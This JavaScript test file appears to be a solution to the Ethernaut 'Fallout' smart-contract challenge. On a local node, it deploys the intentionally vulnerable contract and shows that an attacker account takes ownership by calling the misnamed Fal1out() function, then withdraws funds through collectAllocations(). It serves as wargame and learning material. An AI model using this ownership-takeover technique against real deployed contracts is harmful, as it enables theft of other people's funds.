import { beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { ethers } from "ethers";

const providerUrl = "http://127.0.0.1:8545";

const artifact = JSON.parse(
  await readFile(
    new URL("../artifacts/contracts/Fallout.sol/Fallout.json", import.meta.url),
    "utf8"
  )
);

describe("Ethernaut Challenge 02: Fallout", () => {
  let provider;
  let deployer;
  let attacker;
  let fallout;

  beforeEach(async () => {
    provider = new ethers.JsonRpcProvider(providerUrl);

    deployer = await provider.getSigner(0);
    attacker = await provider.getSigner(1);

    const factory = new ethers.ContractFactory(
      artifact.abi,
      artifact.bytecode,
      deployer
    );

    fallout = await factory.deploy();
    await fallout.waitForDeployment();
  });

  it("has no owner before Fal1out() is called", async () => {
    assert.equal(
      (await fallout.owner()).toLowerCase(),
      ethers.ZeroAddress.toLowerCase()
    );
  });

  it("allows the attacker to claim ownership through Fal1out()", async () => {
    const attackerAddress = await attacker.getAddress();
    const attackerContract = fallout.connect(attacker);

    const tx = await attackerContract.Fal1out();
    const receipt = await tx.wait();

    assert.equal(receipt.status, 1);
    assert.equal(
      (await fallout.owner()).toLowerCase(),
      attackerAddress.toLowerCase()
    );
  });

  it("allows the new owner to execute owner-only functionality", async () => {
    const attackerAddress = await attacker.getAddress();
    const attackerContract = fallout.connect(attacker);

    await (await attackerContract.Fal1out()).wait();

    assert.equal(
      (await fallout.owner()).toLowerCase(),
      attackerAddress.toLowerCase()
    );

    const tx = await attackerContract.collectAllocations();
    const receipt = await tx.wait();

    assert.equal(receipt.status, 1);
  });
});
